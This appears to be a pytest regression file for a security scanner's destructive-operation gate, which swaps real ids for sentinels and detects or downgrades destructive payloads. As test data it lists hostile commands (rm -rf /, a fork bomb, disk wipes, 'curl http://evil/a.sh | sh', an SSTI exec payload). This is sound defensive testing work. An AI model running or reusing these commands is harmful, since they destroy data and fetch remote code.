"""R24-D 破坏性操作闸门回归守卫（2026-09-10）。

背景（真实事故）：3.4-C 只拦「payload 文本里的破坏性 SQL」，拦不住「端点自身的破坏性语义」。
`POST /ops/user/delete`（只判登录、未判角色）的 D1 重放投放的是**合法业务请求**（payload 是一个
真实 uid），handler 直接 `userMapper.deleteById(uid)` —— 请求里没有 SQL 关键字，第一层防线完全
看不见，结果 target-mall 的 T_USER 里 admin/alice/bob 被真删光（只剩 carol），此后所有 vertical
spec 登录失败 → 全判 no_evidence（假阴性）；真实环境不自愈，只能人工回滚。

本测试钉死三件事：
  1. classify_destructive_operation 的操作语义分类必须准确（该拦的拦、该放的放，零误伤）；
  2. neutralize_destructive_spec 的处置正确：可中和的换哨兵 id（零持久化变更但越权判据保留）、
     不可中和的整条 skip（凭据/批量赋值/非 id 的金额变动）；
  3. guard_http_request 发送层硬闸门：破坏性路由的 id 参数一律换哨兵，非破坏性零副作用，
     且绝不误改非 id 参数（如分页 page）。
"""
import pytest

from src.iast.attack_context import (
    ABSENT_RESOURCE_ID,
    DESTRUCTIVE_GUARD_EVENTS,
    classify_destructive_operation,
    destructive_guard_report,
    guard_http_request,
    is_id_param_name,
    neutralize_destructive_spec,
)


# ---------------- 1. 操作语义分类 ----------------


@pytest.mark.parametrize("method,endpoint,expected", [
    # 凭据变更（会打掉扫描账号自己的登录态，必须 skip）
    ("POST", "/profile/password", "credential_mutation"),
    ("POST", "/api/user/reset-password", "credential_mutation"),
    ("GET", "/logout", "credential_mutation"),
    # 批量赋值提权
    ("POST", "/profile/update", "mass_assignment"),
    # 数据删除（动词在路径里，或 HTTP DELETE）
    ("POST", "/ops/user/delete", "data_destroy"),
    ("POST", "/address/delete", "data_destroy"),
    ("GET", "/comment/delete/3", "data_destroy"),
    ("POST", "/cart/remove", "data_destroy"),
    ("DELETE", "/order/5", "data_destroy"),
    # 资金流出
    ("POST", "/wallet/withdraw", "money_out"),
    ("POST", "/wallet/transfer", "money_out"),
    ("POST", "/order/5/refund", "money_out"),
    # 状态覆写
    ("POST", "/ops/order/review", "status_overwrite"),
    ("POST", "/api/comment/moderate", "status_overwrite"),
])
def test_classify_destructive(method, endpoint, expected):
    assert classify_destructive_operation(method, endpoint) == expected


@pytest.mark.parametrize("method,endpoint", [
    ("POST", "/login"),          # 建立会话，不是破坏
    ("GET", "/products"),        # 读
    ("POST", "/comment"),        # 追加型写（存储型 XSS 的证明载体）
    ("POST", "/seckill"),        # 追加型状态推进（竞态证明载体）
    ("POST", "/order/buy"),      # 下单
    ("POST", "/order/5/pay"),    # 支付推进（状态机前置步骤）
    ("POST", "/order/5/ship"),   # 状态推进（状态机漏洞本体）
    ("POST", "/order/import-xml"),  # 导入（XXE 证明载体）
    ("POST", "/payment/callback"),  # 回调签名伪造的证明载体
    ("GET", "/admin/fetch"),     # SSRF 读
    ("POST", "/upload"),         # 路径穿越写（漏洞本体）
])
def test_classify_non_destructive_no_false_positive(method, endpoint):
    assert classify_destructive_operation(method, endpoint) is None


def test_id_param_name_matching():
    assert is_id_param_name("id")
    assert is_id_param_name("uid")
    assert is_id_param_name("orderId")           # 驼峰
    assert is_id_param_name("order_id")
    assert is_id_param_name("productId")
    assert is_id_param_name("victim_resource_id")
    # 不得误伤：page/amount/status/keyword 都不是资源 id；identity 不能被 "id" 子串命中
    assert not is_id_param_name("page")
    assert not is_id_param_name("amount")
    assert not is_id_param_name("status")
    assert not is_id_param_name("keyword")
    assert not is_id_param_name("identity")
    assert not is_id_param_name("")


# ---------------- 2. spec 层归一 ----------------


def test_absent_id_for_delete_user():
    spec = {"target_endpoint": "/ops/user/delete", "http_method": "POST",
            "param_name": "uid", "param_value": "2",
            "taint_marker": "s4st41deadbeef", "id": 99}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert note["category"] == "data_destroy"
    assert out["param_value"] == ABSENT_RESOURCE_ID
    # canary 是 I1 的请求级身份，绝不能被改
    assert out["taint_marker"] == "s4st41deadbeef"
    # 入参不被就地修改（纯函数语义）
    assert spec["param_value"] == "2"


def test_absent_id_for_victim_resource_id():
    spec = {"target_endpoint": "/address/delete", "http_method": "POST",
            "victim_resource_id": "1"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["victim_resource_id"] == ABSENT_RESOURCE_ID


def test_path_template_gets_synthetic_param():
    spec = {"target_endpoint": "/order/{id}/refund", "http_method": "POST"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["param_name"] == "id"
    assert out["param_location"] == "path"
    assert out["param_value"] == ABSENT_RESOURCE_ID


def test_representative_params_id_rewritten():
    spec = {"target_endpoint": "/cart/remove", "http_method": "POST",
            "representative_request_params": [
                {"param_name": "productId", "param_location": "query", "param_value": "7"},
                {"param_name": "keyword", "param_location": "query", "param_value": "x"},
            ]}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    reps = out["representative_request_params"]
    assert reps[0]["param_value"] == ABSENT_RESOURCE_ID
    assert reps[1]["param_value"] == "x"          # 非 id 参数不动


@pytest.mark.parametrize("spec", [
    {"target_endpoint": "/wallet/withdraw", "http_method": "POST",
     "param_name": "amount", "param_value": "-100"},
    {"target_endpoint": "/ops/user/delete", "http_method": "POST"},   # 破坏性但无 id 可换
])
def test_skip_categories_and_no_id(spec):
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "skip"
    assert out == spec                              # skip 时原样返回，交给调用方放弃投放


@pytest.mark.parametrize("spec", [
    {"target_endpoint": "/profile/password", "http_method": "POST",
     "param_name": "id", "param_value": "3"},
    {"target_endpoint": "/profile/update", "http_method": "POST",
     "param_name": "id", "param_value": "3"},
])
def test_restore_after_replaces_skip_for_restorable_categories(spec):
    """R26：凭据变更 / 批量赋值改为「可回滚验证」放行，不再是整条 skip。

    闸门本身不改写任何值（out == spec）—— 取基线与回滚由调用方按 restore_after 契约执行；
    取不到可回滚基类时调用方必须放弃投放，所以放行不等于放开破坏。
    """
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "restore_after"
    assert "回滚" in note["reason"]
    assert out == spec


def test_non_destructive_spec_untouched():
    spec = {"target_endpoint": "/products", "http_method": "GET",
            "param_name": "keyword", "param_value": "x"}
    out, note = neutralize_destructive_spec(spec)
    assert note == {}
    assert out == spec
    assert out is not spec or out == spec


# ---------------- 3. 发送层硬闸门 ----------------


def test_http_guard_rewrites_id_params():
    r = guard_http_request("POST", "http://t/ops/user/delete",
                           params={"uid": "2", "note": "x"})
    assert r["params"]["uid"] == ABSENT_RESOURCE_ID
    assert r["params"]["note"] == "x"
    assert r["note"]["action"] == "absent_id"


def test_http_guard_rewrites_body_id():
    r = guard_http_request("POST", "http://t/ops/order/review",
                           json_body={"orderId": 5, "status": "PAID"})
    assert r["json_body"]["orderId"] == ABSENT_RESOURCE_ID
    assert r["json_body"]["status"] == "PAID"


def test_http_guard_no_false_positive_on_pagination():
    # /api/v2/delete 是破坏性路由，但 page 不是资源 id → 不改（且不改写 URL 路径，避免把 "2" 当 id）
    r = guard_http_request("POST", "http://t/api/v2/delete", params={"page": "2"})
    assert r["params"]["page"] == "2"
    assert r["note"] == {}


def test_http_guard_noop_on_read_route():
    r = guard_http_request("GET", "http://t/products", params={"keyword": "x"})
    assert r["params"] == {"keyword": "x"}
    assert r["note"] == {}


def test_guard_events_recorded_and_reported():
    before = len(DESTRUCTIVE_GUARD_EVENTS)
    neutralize_destructive_spec({"target_endpoint": "/ops/user/delete",
                                 "http_method": "POST",
                                 "param_name": "uid", "param_value": "9"})
    assert len(DESTRUCTIVE_GUARD_EVENTS) > before
    rep = destructive_guard_report()
    assert rep["total"] >= 1
    assert "absent_id" in rep["by_action"]


# ---------------- 4. verify() 派发层 skip 短路径 ----------------


def test_verify_short_circuits_skipped_destructive_spec():
    # 用 /wallet/withdraw（money_out + 非 id 参数）—— R26 后它仍是整条 skip，
    # /profile/* 已改为 restore_after，不再走这条短路径（见下一条用例）。
    from src.iast import business_logic
    spec = {"target_endpoint": "/wallet/withdraw", "http_method": "POST",
            "param_name": "amount", "param_value": "-100"}
    res = business_logic.verify("vertical", spec, {"service_url": "http://127.0.0.1:1"}, db=None)
    assert res["skipped"] is True
    assert res["confirmed"] is False
    assert res["verdict"] == "skipped_destructive_guard"
    assert res["destructive_guard"]["action"] == "skip"


def test_verify_does_not_short_circuit_restore_after_without_baseline():
    """restore_after 不走短路径，但取不到基线时必须放弃投放（不确认、不落 skipped）。"""
    from src.iast import business_logic
    spec = {"target_endpoint": "/profile/password", "http_method": "POST",
            "param_name": "id", "param_value": "3"}
    # 127.0.0.1:1 连不通 → 快照必失败 → 无基线
    res = business_logic.verify("vertical", spec, {"service_url": "http://127.0.0.1:1"}, db=None)
    assert res["confirmed"] is False
    assert res["verdict"] == "no_restore_baseline"
    assert res["restore"]["attempted"] is False


# ---------------- 5. 破坏性「系统命令」payload（R24-D 第二类破坏性）----------------


def test_destructive_command_detected():
    from src.iast.attack_context import is_destructive_command_payload as is_dc
    assert is_dc("127.0.0.1; rm -rf /")
    assert is_dc("x && mkfs.ext4 /dev/sda1")
    assert is_dc("dd if=/dev/zero of=/dev/sda bs=1M")
    assert is_dc("127.0.0.1; shutdown -h now")
    assert is_dc(":(){ :|:& };:")
    assert is_dc("curl http://evil/a.sh | sh")
    assert is_dc("del /f /s /q C://*")


def test_benign_command_not_destructive():
    from src.iast.attack_context import is_destructive_command_payload as is_dc
    assert not is_dc("127.0.0.1; id")
    assert not is_dc("127.0.0.1 & whoami")
    assert not is_dc("127.0.0.1; cat /etc/passwd")
    assert not is_dc("127.0.0.1; sleep 5")
    assert not is_dc("ping -c 1 127.0.0.1")
    assert not is_dc("")


def test_downgrade_neutralizes_exec_arg_keeping_structure():
    """SSTI/SpEL 结构化 payload：只换 exec 参数，保留模板结构（仍可证明注入可达）。"""
    from src.iast.attack_context import downgrade_destructive_payload as dg
    ssti = 'tpl=[[${T(java.lang.Runtime).getRuntime().exec("rm -rf /")}]]'
    out = dg(ssti, "template-injection")
    assert "rm -rf" not in out
    assert 'exec("whoami")' in out
    assert out.startswith("tpl=[[${") and out.endswith("}]]")   # 结构未破坏


def test_downgrade_replaces_bare_destructive_command():
    from src.iast.attack_context import downgrade_destructive_payload as dg
    assert dg("127.0.0.1; rm -rf /", "command_injection") == "whoami"


def test_downgrade_keeps_benign_command_payload():
    from src.iast.attack_context import downgrade_destructive_payload as dg
    assert dg("127.0.0.1; id", "command_injection") == "127.0.0.1; id"
    assert dg("127.0.0.1; sleep 5", "command_injection") == "127.0.0.1; sleep 5"


# ---------------- 6. payload 前缀剥离（#8 SSTI 未确认真因）----------------


def test_normalize_strips_param_prefix():
    from src.iast.attack_context import normalize_attack_payload as norm
    assert norm('tpl=[[${7*7}]]', "tpl") == '[[${7*7}]]'
    assert norm('TPL=[[${7*7}]]', "tpl") == '[[${7*7}]]'      # 大小写不敏感
    assert norm('[[${7*7}]]', "tpl") == '[[${7*7}]]'          # 无前缀不动
    assert norm('url=http://x/y', "id") == 'url=http://x/y'   # 参数名不匹配不动
    assert norm('', "tpl") == ''


# ---------------- 7. R24-D 补强：堵死「真实 id 仍被发出」的剩余路径 ----------------
# 背景（本会话复查发现）：首版闸门只改 param_value / body / rep param_value 三处，
# 且 victim_resource_id==VICTIM_FROM_POOL 被列入豁免。而重放期：
#   - replay_vertical：param_name 有值且 param_value 为空 → 回填受害者/攻击者真实 user_id；
#   - replay_bola / replay_race：vid=="VICTIM_FROM_POOL" → 从账户池解析真实对象 id；
# 于是「闸门判 absent_id」的破坏性 spec 仍可能把真实 id 发出去，真删/真改照旧发生。
# 下面五条把这三类绕过路径钉死。


def test_victim_from_pool_is_neutralized():
    """VICTIM_FROM_POOL 必须在破坏性端点被钉成哨兵（否则重放期解析出真实 victim id）。"""
    spec = {"target_endpoint": "/address/delete", "http_method": "POST",
            "victim_resource_id": "VICTIM_FROM_POOL", "taint_marker": "s4st41dead"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["victim_resource_id"] == ABSENT_RESOURCE_ID
    assert out["taint_marker"] == "s4st41dead"          # canary 绝不被动
    assert spec["victim_resource_id"] == "VICTIM_FROM_POOL"   # 纯函数


def test_id_param_without_param_value_still_pinned():
    """param_name 是 id 类名时，即便 spec 没带 param_value 键也要钉哨兵。

    否则 replay_vertical 会用受害者真实 uid 回填 param_value → deleteById(真实 uid) 真删。
    """
    spec = {"target_endpoint": "/ops/user/delete", "http_method": "POST", "param_name": "uid"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["param_value"] == ABSENT_RESOURCE_ID


@pytest.mark.parametrize("endpoint,param", [
    ("/wallet/withdraw", "amount"),
    ("/wallet/transfer", "amount"),
    ("/api/comment/moderate", "status"),
])
def test_non_id_param_destructive_action_skipped(endpoint, param):
    """变更本体骑在非 id 参数上（金额/状态）→ 换 id 挡不住真实变更，必须 skip。"""
    spec = {"target_endpoint": endpoint, "http_method": "POST",
            "param_name": param, "param_value": "-100",
            "victim_resource_id": "VICTIM_FROM_POOL"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "skip"
    assert out == spec


def test_non_id_param_with_path_id_is_still_neutralized():
    """非 id 参数但路径带 {id} 模板 → 资源可由路径定位，仍走 absent_id。"""
    spec = {"target_endpoint": "/order/{id}/refund", "http_method": "POST",
            "param_name": "amount", "param_value": "99999"}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["param_value"] == ABSENT_RESOURCE_ID


def test_representative_params_db_shape_rewritten():
    """DB 态 rep params 用 name/value 键（entry_discovery 产出）—— 只认 param_name 会漏改。"""
    spec = {"target_endpoint": "/cart/remove", "http_method": "POST",
            "representative_request_params": [
                {"name": "productId", "location": "query", "value": "7"},
                {"name": "keyword", "location": "query", "value": "x"},
            ]}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    reps = out["representative_request_params"]
    assert reps[0]["value"] == ABSENT_RESOURCE_ID
    assert reps[1]["value"] == "x"          # 非 id 参数不动


def test_hardening_keeps_all_id_locators_absent_for_delete_user():
    """端到端形态：/ops/user/delete 真实 spec（uid + VICTIM_FROM_POOL + DB 态 rep）
    归一后 uid/vid/rep 全部为哨兵，canary 不动 —— 重放只可能 no-op。"""
    spec = {"target_endpoint": "/ops/user/delete", "http_method": "POST",
            "param_name": "uid", "param_location": "query",
            "victim_resource_id": "VICTIM_FROM_POOL", "taint_marker": "s4st41beef",
            "representative_request_params": [
                {"name": "uid", "location": "query", "value": "s4st41beef"},
            ]}
    out, note = neutralize_destructive_spec(spec)
    assert note["action"] == "absent_id"
    assert out["param_value"] == ABSENT_RESOURCE_ID
    assert out["victim_resource_id"] == ABSENT_RESOURCE_ID
    assert out["representative_request_params"][0]["value"] == ABSENT_RESOURCE_ID
    assert out["taint_marker"] == "s4st41beef"
